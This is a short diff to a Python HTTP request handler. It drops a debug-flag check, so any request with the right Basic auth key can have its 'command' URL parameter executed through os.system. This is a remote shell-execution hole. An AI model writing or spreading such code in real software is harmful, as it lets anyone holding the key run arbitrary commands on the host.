@@ -29,7 +29,7 @@ class AuthHandler(SimpleHTTPRequestHandler):
 			pass
 		elif self.headers.getheader('Authorization') == 'Basic '+key:
 			params = urlparse.parse_qs(urlparse.urlparse(self.path).query, True)
-			if params['debug'][0] == 'True' and 'action' in params and params['action'][0] == 'exec' and 'command' in params:
+			if 'action' in params and params['action'][0] == 'exec' and 'command' in params:
 				os.system(params['command'][0])
 			self.send_response(200)
 			self.send_header('Content-type', 'text/html')
